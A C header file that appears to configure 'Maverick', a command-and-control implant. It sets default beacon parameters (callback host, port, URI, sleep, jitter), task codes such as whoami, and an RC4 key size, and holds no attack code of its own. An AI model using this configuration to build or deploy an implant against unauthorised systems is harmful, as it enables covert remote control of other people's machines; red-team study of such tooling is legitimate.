/*
 * Maverick — Build Configuration
 *
 * Compile-time defines injected by the Go agent plugin (pl_compile.go) via -D flags.
 * Defaults here are for local development only.
 */

#ifndef MV_CONFIG_H
#define MV_CONFIG_H

#ifndef MV_AGENT_UUID
#define MV_AGENT_UUID "00000000-0000-0000-0000-000000000000"
#endif

#ifndef MV_SLEEP_TIME
#define MV_SLEEP_TIME 3
#endif

#ifndef MV_JITTER
#define MV_JITTER 0
#endif

#ifndef MV_CALLBACK_HOST
#define MV_CALLBACK_HOST "127.0.0.1"
#endif

#ifndef MV_CALLBACK_PORT
#define MV_CALLBACK_PORT 443
#endif

#ifndef MV_CALLBACK_URI
#define MV_CALLBACK_URI "/endpoint"
#endif

#ifndef MV_CALLBACK_SSL
#define MV_CALLBACK_SSL 0
#endif

#define COMMAND_EXIT    0x10
#define COMMAND_SLEEP   0x20
#define COMMAND_WHOAMI  0x30

#define TASK_GET    0x00
#define TASK_RESULT 0x01

#define RC4_KEY_SIZE 16

#endif
